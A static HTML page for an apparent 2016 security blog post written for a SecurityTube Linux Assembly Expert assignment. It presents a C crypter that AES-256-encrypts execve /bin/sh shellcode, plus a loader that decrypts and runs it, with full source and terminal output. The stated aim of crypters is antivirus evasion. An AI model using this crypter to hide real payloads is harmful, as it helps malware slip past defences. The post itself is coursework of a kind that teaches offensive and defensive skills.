@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--><!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8"><![endif]--><!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9"><![endif]--><!--[if gt IE 8]><!--><html class="no-js">
+<!--<![endif]--> <head> <meta charset="UTF-8"> <meta content="text/html; charset=UTF-8" http-equiv="Content-Type"> <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> <title>SLAE Assignment 7 - Crypters – popped.io</title> <meta name="description" content="A collection of my security research, random projects and attempts to amuse."> <meta name="keywords" content="SLAE, SecurityTube, Assignment, Shellcode, nasm, assembly, crypter"> <!-- Twitter Cards --> <meta name="twitter:card" content="summary"> <meta name="twitter:image" content="http://localhost:4000/assets/img/me.png"> <meta name="twitter:title" content="SLAE Assignment 7 - Crypters"> <meta name="twitter:description" content="SLAE Assignment StubThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification."> <meta name="twitter:site" content="@skawasec"> <meta name="twitter:creator" content="@skawasec"> <!-- Open Graph --> <meta property="og:locale" content="en_US"> <meta property="og:type" content="article"> <meta property="og:title" content="SLAE Assignment 7 - Crypters"> <meta property="og:description" content="SLAE Assignment StubThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification."> <meta property="og:url" content="http://localhost:4000/SLAE-Assignment-7/"> <meta property="og:site_name" content="popped.io"> <meta property="og:image" content="http://localhost:4000/assets/img/me.png"> <link rel="canonical" href="http://localhost:4000/SLAE-Assignment-7/"> <link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="popped.io Feed"> <!-- Handheld --> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- CSS --> <link rel="stylesheet" href="http://localhost:4000/assets/css/main.css"> <!-- JS --> <script src="http://localhost:4000/assets/js/modernizr-3.3.1.custom.min.js"></script> <!-- Favicons --> <link rel="apple-touch-icon" href="http://localhost:4000/assets/img/favicons/apple-icon-precomposed.png"> <link rel="apple-touch-icon" sizes="72x72" href="http://localhost:4000/assets/img/favicons/apple-icon-72x72.png"> <link rel="apple-touch-icon" sizes="114x114" href="http://localhost:4000/assets/img/favicons/apple-icon-114x114.png"> <link rel="apple-touch-icon" sizes="144x144" href="http://localhost:4000/assets/img/favicons/apple-icon-144x144.png"> <link rel="shortcut icon" type="image/png" href="http://localhost:4000/favicon.png"> <link rel="shortcut icon" href="http://localhost:4000/favicon.ico"> <!-- Background Image --> <style type="text/css">body {background-image:url(http://localhost:4000/assets/img/placeholder-big.jpg); background-repeat: no-repeat; background-size: cover; }</style> <!-- Post Feature Image --> </head> <body> <nav id="dl-menu" class="dl-menuwrapper" role="navigation"> <button class="dl-trigger">Open Menu</button> <ul class="dl-menu"> <li><a href="http://localhost:4000/">Home</a></li> <li> <a href="#">About</a> <ul class="dl-submenu"> <li> <img src="http://localhost:4000/assets/img/me.png" alt="popped.io photo" class="author-photo"> <h4>popped.io</h4> <p>A collection of my security research, random projects and attempts to amuse.</p> </li> <li><a href="http://localhost:4000/about/"><span class="btn btn-inverse">Learn More</span></a></li> <li> <a href="http://twitter.com/skawasec" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-twitter-square"></i> Twitter</a> </li> <li> <a href="http://linkedin.com/in/sanjivkawa" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-linkedin-square"></i> LinkedIn</a> </li> <li> <a href="http://github.com/skahwah" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-github"></i> Github</a> </li> </ul>
+<!-- /.dl-submenu --> </li> <li> <a href="#">Posts</a> <ul class="dl-submenu"> <li><a href="http://localhost:4000/posts/">All Posts</a></li> <li><a href="http://localhost:4000/tags/">All Tags</a></li> </ul> </li> <li><a href="http://localhost:4000/projects/">Projects</a></li> </ul>
+<!-- /.dl-menu --> </nav><!-- /.dl-menuwrapper --> <!-- Header --> <header class="header" role="banner"> <div class="wrapper animated fadeIn"> <div class="content"> <div class="post-title "> <h1>SLAE Assignment 7 - Crypters</h1> <h4>07 Dec 2016</h4> <p class="reading-time"> <i class="fa fa-clock-o"></i> Reading time ~6 minutes </p>
+<!-- /.entry-reading-time --> <a class="btn zoombtn" href="http://localhost:4000/posts/"> <i class="fa fa-chevron-left"></i> </a> </div> <h3 id="slae-assignment-stub">SLAE Assignment Stub</h3> <p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.</p> <p><a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p> <p>Student ID: SLAE-807</p> <h3 id="assignment-7-requirements">Assignment 7 Requirements</h3> <ul> <li>Create a custom crypter</li> <li>Feel free to use any encryption schema</li> <li>Use any programming language</li> </ul> <h3 id="crypters">Crypters</h3> <p>Crypters are a program that encrypt an executable or shellcode and decrypt the executable or shellcode at run time. The goal of crypters is to evade antivirus detection.</p> <p>For this assignment, I decided to write the crypter in C and use the <a href="https://wiki.openssl.org/index.php/EVP_Symmetric_Encryption_and_Decryption">OpenSSL EVP</a> symmetric cipher routine. The encryption algorithm that was chosen is AES-256 with an 128 bit initialization vector in CBC mode.</p> <h3 id="the-shellcode">The Shellcode</h3> <p>The example shellcode I will be using is a really simple stack-based <code class="highlighter-rouge">execve</code> SYSCALL that executes <code class="highlighter-rouge">/bin/sh</code>.</p> <p>The nasm source is located <a href="https://github.com/skahwah/slae/blob/master/execve-stack/execve-stack.nasm">here</a> and a brief breakdown of the shellcode is located <a href="https://popped.io/execve-stack/">here</a><a>.</a></p> <p>Here are the opcodes:</p> <div class="highlighter-rouge"><pre class="highlight"><code>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+</code></pre></div> <h3 id="encryptc">encrypt.c</h3> <p>encrypt.c is responsible for taking user supplied shellcode and encrypting using a 256 bit AES key and 128 bit initialization vector. Both the AES key and IV are randomly generated.</p> <p>encrypt.c can be found <a href="https://github.com/skahwah/slae/blob/master/assignment7/encrypt.c">here</a>.</p> <p>Below is an explanation of encrypt.c</p> <div class="highlighter-rouge"><pre class="highlight"><code>/*
+encrypt.c
+Sanjiv Kawa (@skawasec)
+www.popped.io
+December 7, 2016
+
+This program encrypts user supplied shellcode.
+Please use decrypt.c to decrypt and execute the shellcode.
+
+compile: encrypt.c -l crypto -o encrypt
+*/
+
+#include &lt;openssl/conf.h&gt;
+#include &lt;openssl/evp.h&gt;
+#include &lt;openssl/err.h&gt;
+#include &lt;string.h&gt;
+
+//print shellcode in \x format
+void print_shellcode(unsigned char *shellcode)
+{
+  int i, len;
+
+  len = strlen(shellcode);
+
+  for (i = 0; i &lt; len; i++)
+  {
+    printf("\\x%02x", shellcode[i]);
+  }
+    printf("\n");
+}
+
+//generate a random string for AES key and initialization vector
+//modified http://codereview.stackexchange.com/questions/29198/random-string-generator-in-c
+static char *random_string(char *str, size_t size)
+{
+  const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+
+  int i, n;
+  n = 0;
+
+  for (i = 0; n &lt; size; n++)
+  {
+    int key = rand() % (int) (sizeof charset - 1);
+    str[n] = charset[key];
+  }
+
+  str[size] = '\0';
+
+  return str;
+}
+
+//main
+int main (void)
+{
+  unsigned char key[32]; //256 bit key
+  unsigned char iv[16]; //128 bitinitialization vector
+
+  int key_len, iv_len;
+  key_len = 32;
+  iv_len = 16;
+
+  random_string(key, key_len); //generate random AES 256 bit key
+  random_string(iv, iv_len); //generate random AES 128 bit initialization vector
+
+  printf("[+] AES 128 bit IV: %s\n", (iv));
+  printf("[+] AES 256 bit Key: %s\n", (key));
+
+  //plaintext shellcode
+  unsigned char shellcode[] = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+  unsigned char encrypted[128]; //buffer for encrypted shellcode
+  int shellcode_len, encrypted_len; //length of shellcode
+
+  shellcode_len = strlen(shellcode);
+
+  //initialize the library
+  ERR_load_crypto_strings();
+  OpenSSL_add_all_algorithms();
+  OPENSSL_config(NULL);
+
+  //encrypt the shellcode
+  encrypted_len = encrypt(shellcode, shellcode_len, key, iv, encrypted);
+
+  //null terminate the shellcode for printing
+  shellcode[shellcode_len] = '\0';
+  encrypted[encrypted_len] = '\0';
+
+  //print shellcode in both forms
+  printf("[+] Original Shellcode (%d bytes):\n", (shellcode_len));
+  print_shellcode(shellcode);
+
+  printf("[+] Encrypted Shellcode (%d bytes):\n", (encrypted_len));
+  print_shellcode(encrypted);
+
+  //clean up
+  EVP_cleanup();
+  ERR_free_strings();
+
+  return 0;
+}
+
+//error handler
+void handleErrors(void)
+{
+  ERR_print_errors_fp(stderr);
+  abort();
+}
+
+//encryption function for AES 256 with a 128 bit initialization vector
+int encrypt(unsigned char *shellcode, int shellcode_len, unsigned char *key, unsigned char *iv, unsigned char *encrypted)
+{
+  EVP_CIPHER_CTX *ciphertext; //openssl EVP ciphertext structure
+
+  int len, encrypted_len;
+
+  //create and initialize the context
+  if(!(ciphertext = EVP_CIPHER_CTX_new()))
+    handleErrors(); //error handler
+
+  //initialize the encryption operation for AES 256 with a 128 bit initialization vector
+  EVP_EncryptInit_ex(ciphertext, EVP_aes_256_cbc(), NULL, key, iv);
+
+  EVP_EncryptUpdate(ciphertext, encrypted, &amp;len, shellcode, shellcode_len); //encrypt shellcode
+
+  encrypted_len = len; //encrypted shellcode length
+
+  EVP_EncryptFinal_ex(ciphertext, encrypted + len, &amp;len); //finalize encryption
+
+  encrypted_len += len; //encrypted shellcode length
+
+  EVP_CIPHER_CTX_free(ciphertext); //clean up
+
+  return encrypted_len;
+}
+</code></pre></div> <h3 id="decryptc">decrypt.c</h3> <p>decrypt.c is responsible for taking the 256 bit AES key and 128 bit initialization vector used to encrypt the shellcode string as well as the encrypted shellcode string and decrypting it to it’s original form.</p> <p>After decrypting the shellcode, decrypt.c continues to execute the shellcode and use the stack-based <code class="highlighter-rouge">execve</code> syscall to execute <code class="highlighter-rouge">/bin/sh</code>.</p> <p>decrypt.c can be found <a href="https://github.com/skahwah/slae/blob/master/assignment7/decrypt.c">here</a>.</p> <p>Below is an explanation of decrypt.c</p> <div class="highlighter-rouge"><pre class="highlight"><code>/*
+decrypt.c
+Sanjiv Kawa (@skawasec)
+www.popped.io
+December 7, 2016
+
+This program decrypts and executes the shellcode encrypted by encrypt.c
+
+Compile: gcc -fno-stack-protector -z execstack decrypt.c -l crypto -o decrypt
+*/
+
+#include &lt;openssl/conf.h&gt;
+#include &lt;openssl/evp.h&gt;
+#include &lt;openssl/err.h&gt;
+#include &lt;string.h&gt;
+#include &lt;time.h&gt;
+
+//print shellcode in \x format
+void print_shellcode(unsigned char *shellcode)
+{
+  int i, len;
+
+  len = strlen(shellcode);
+
+  for (i = 0; i &lt; len; i++)
+  {
+    printf("\\x%02x", shellcode[i]);
+  }
+    printf("\n");
+}
+
+//execute shellcode
+void execute_shellcode(unsigned char *shellcode)
+{
+  printf("\n");
+  int (*ret)() = (int(*)())shellcode;
+  ret();
+}
+
+//main
+int main (void)
+{
+  unsigned char decrypted[128]; //buffer for decrypted shellcode
+  int decrypted_len, encrypted_len; //length of shellcode
+
+
+  //128 bit AES initialization vector used to encrypt the shellcode
+  unsigned char iv[] = "KSB1FebW397VI5uG";
+
+  //256 bit AES key used to encrypt the shellcode
+  unsigned char key[] = "PKdhtXMmr18n2L9K88eMlGn7CcctT9Rw";
+
+  //encrypted shellcode
+  unsigned char encrypted[] = "\xb0\x69\x09\xde\xc5\x63\x0e\x69\x5c\xd1\x7e\x34\xf3\xc1\x7b\x28\x6c\x47\x48\xd4\x5b\x83\x82\x6b\x4b\xb5\x52\x47\xb1\x3e\xf2\x70";
+
+  //length of encrypted shellcode
+  encrypted_len = strlen(encrypted);
+
+  printf("[+] Encrypted Shellcode (%d bytes):\n", (encrypted_len));
+  print_shellcode(encrypted);
+
+  printf("[+] AES 128 bit IV: %s\n", (iv));
+  printf("[+] AES 256 bit Key: %s\n", (key));
+
+  //initialize the library
+  ERR_load_crypto_strings();
+  OpenSSL_add_all_algorithms();
+  OPENSSL_config(NULL);
+
+  //decrypt the shellcode
+  decrypted_len = decrypt(encrypted, encrypted_len, key, iv, decrypted);
+
+  //null terminate the shellcode for printing
+  decrypted[decrypted_len] = '\0';
+
+  printf("[+] Decrypted Shellcode (%d bytes):\n", (decrypted_len));
+  print_shellcode(decrypted);
+
+  //clean up
+  EVP_cleanup();
+  ERR_free_strings();
+
+  printf("[+] Executing Shellcode:\n");
+  //execute shellcode
+  execute_shellcode(decrypted);
+
+  return 0;
+}
+
+//error handler
+void handleErrors(void)
+{
+  ERR_print_errors_fp(stderr);
+  abort();
+}
+
+//decryption function for AES 256 with a 128 bit initialization vector
+int decrypt(unsigned char *encrypted, int encrypted_len, unsigned char *key, unsigned char *iv, unsigned char *decrypted)
+{
+  EVP_CIPHER_CTX *ciphertext; //openssl EVP ciphertext structure
+
+  int len, decrypted_len;
+
+  //create and initialize the context
+  if(!(ciphertext = EVP_CIPHER_CTX_new()))
+    handleErrors(); //error handler
+
+  //initialize the decryption operation for AES 256 with a 128 bit initialization vector
+  EVP_DecryptInit_ex(ciphertext, EVP_aes_256_cbc(), NULL, key, iv);
+
+  EVP_DecryptUpdate(ciphertext, decrypted, &amp;len, encrypted, encrypted_len); //decrypt shellcode
+
+  decrypted_len = len; //decrypted shellcode length
+
+  EVP_DecryptFinal_ex(ciphertext, decrypted + len, &amp;len); //finalize encryption
+
+  decrypted_len += len; //decrypted shellcode length
+
+  EVP_CIPHER_CTX_free(ciphertext); //clean up
+
+  return decrypted_len;
+}
+</code></pre></div> <h3 id="compiling-and-executing">Compiling and Executing</h3> <p>First, encrypt.c is compiled and then executed. The 256 bit AES key and 128 bit initialization vector used to encrypt the shellcode are displayed, along with the shellcode in it’s original and encrypted forms.</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment7$ gcc encrypt.c -l crypto -o encrypt
+skawa@ubuntu:~/Desktop/code/assignment/assignment7$ ./encrypt
+[+] AES 128 bit IV: KSB1FebW397VI5uG
+[+] AES 256 bit Key: PKdhtXMmr18n2L9K88eMlGn7CcctT9Rw
+[+] Original Shellcode (25 bytes):
+\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+[+] Encrypted Shellcode (32 bytes):
+\xb0\x69\x09\xde\xc5\x63\x0e\x69\x5c\xd1\x7e\x34\xf3\xc1\x7b\x28\x6c\x47\x48\xd4\x5b\x83\x82\x6b\x4b\xb5\x52\x47\xb1\x3e\xf2\x70
+</code></pre></div> <p>Second, the 256 bit AES key, 128 bit initialization vector and encrypted shellcode are all placed into decrypt.c</p> <p>decrypt.c then uses the aforementioned key and IV to decrypt the encrypted shellcode and display the shellcode in it’s original form. The <code class="highlighter-rouge">execute_shellcode</code> function is then called and passes control of the program to the shellcode, this continues to use <code class="highlighter-rouge">execve</code> to execute <code class="highlighter-rouge">/bin/sh</code>.</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment7$ gcc encrypt.c -l crypto -o encrypt
+skawa@ubuntu:~/Desktop/code/assignment/assignment7$ ./encrypt
+[+] AES 128 bit IV: KSB1FebW397VI5uG
+[+] AES 256 bit Key: PKdhtXMmr18n2L9K88eMlGn7CcctT9Rw
+[+] Original Shellcode (25 bytes):
+\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+[+] Encrypted Shellcode (32 bytes):
+\xb0\x69\x09\xde\xc5\x63\x0e\x69\x5c\xd1\x7e\x34\xf3\xc1\x7b\x28\x6c\x47\x48\xd4\x5b\x83\x82\x6b\x4b\xb5\x52\x47\xb1\x3e\xf2\x70
+skawa@ubuntu:~/Desktop/code/assignment/assignment7$ vim decrypt.c
+skawa@ubuntu:~/Desktop/code/assignment/assignment7$ cat decrypt.c | grep "iv\[\]"
+  unsigned char iv[] = "KSB1FebW397VI5uG";
+skawa@ubuntu:~/Desktop/code/assignment/assignment7$ cat decrypt.c | grep "key\[\]"
+  unsigned char key[] = "PKdhtXMmr18n2L9K88eMlGn7CcctT9Rw";
+skawa@ubuntu:~/Desktop/code/assignment/assignment7$ cat decrypt.c | grep "encrypted\[\]"
+  unsigned char encrypted[] = "\xb0\x69\x09\xde\xc5\x63\x0e\x69\x5c\xd1\x7e\x34\xf3\xc1\x7b\x28\x6c\x47\x48\xd4\x5b\x83\x82\x6b\x4b\xb5\x52\x47\xb1\x3e\xf2\x70";
+skawa@ubuntu:~/Desktop/code/assignment/assignment7$ gcc -fno-stack-protector -z execstack decrypt.c -l crypto -o decrypt
+skawa@ubuntu:~/Desktop/code/assignment/assignment7$ ./decrypt
+[+] Encrypted Shellcode (32 bytes):
+\xb0\x69\x09\xde\xc5\x63\x0e\x69\x5c\xd1\x7e\x34\xf3\xc1\x7b\x28\x6c\x47\x48\xd4\x5b\x83\x82\x6b\x4b\xb5\x52\x47\xb1\x3e\xf2\x70
+[+] AES 128 bit IV: KSB1FebW397VI5uG
+[+] AES 256 bit Key: PKdhtXMmr18n2L9K88eMlGn7CcctT9Rw
+[+] Decrypted Shellcode (25 bytes):
+\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+[+] Executing Shellcode:
+
+$
+</code></pre></div> <div class="entry-meta"> <br> <hr> <span class="entry-tags"><a href="http://localhost:4000/tags/#SLAE" title="Pages tagged SLAE" class="tag"><span class="term">SLAE</span></a><a href="http://localhost:4000/tags/#SecurityTube" title="Pages tagged SecurityTube" class="tag"><span class="term">SecurityTube</span></a><a href="http://localhost:4000/tags/#Assignment" title="Pages tagged Assignment" class="tag"><span class="term">Assignment</span></a><a href="http://localhost:4000/tags/#Shellcode" title="Pages tagged Shellcode" class="tag"><span class="term">Shellcode</span></a><a href="http://localhost:4000/tags/#nasm" title="Pages tagged nasm" class="tag"><span class="term">nasm</span></a><a href="http://localhost:4000/tags/#assembly" title="Pages tagged assembly" class="tag"><span class="term">assembly</span></a><a href="http://localhost:4000/tags/#crypter" title="Pages tagged crypter" class="tag"><span class="term">crypter</span></a></span> <span class="social-share"> <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/SLAE-Assignment-7/" title="Share on Facebook" class="tag"> <span class="term"><i class="fa fa-facebook-square"></i> Like</span> </a> <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/SLAE-Assignment-7/" title="Share on Twitter" class="tag"> <span class="term"><i class="fa fa-twitter-square"></i> Tweet</span> </a> <a href="https://plus.google.com/share?url=http://localhost:4000/SLAE-Assignment-7/" title="Share on Google+" class="tag"> <span class="term"><i class="fa fa-google-plus-square"></i> +1</span> </a> </span> <div style="clear:both"></div> </div> </div> </div> <section id="disqus_thread" class="animated fadeInUp"></section><!-- /#disqus_thread --> </header> <!-- JS --> <script src="http://localhost:4000/assets/js/jquery-1.12.0.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.dlmenu.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.goup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.magnific-popup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.fitvid.min.js"></script> <script src="http://localhost:4000/assets/js/scripts.js"></script> <!-- Asynchronous Google Analytics snippet --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','//www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-85516324-1', 'auto'); ga('require', 'linkid', 'linkid.js'); ga('send', 'pageview'); </script> <script type="text/javascript"> var disqus_shortname = 'sanjivkawa'; (function() { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); })(); (function () { var s = document.createElement('script'); s.async = true; s.type = 'text/javascript'; s.src = '//' + disqus_shortname + '.disqus.com/count.js'; (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s); }()); </script> <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+</noscript> <!-- MathJax --> <script async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> </body> </html>
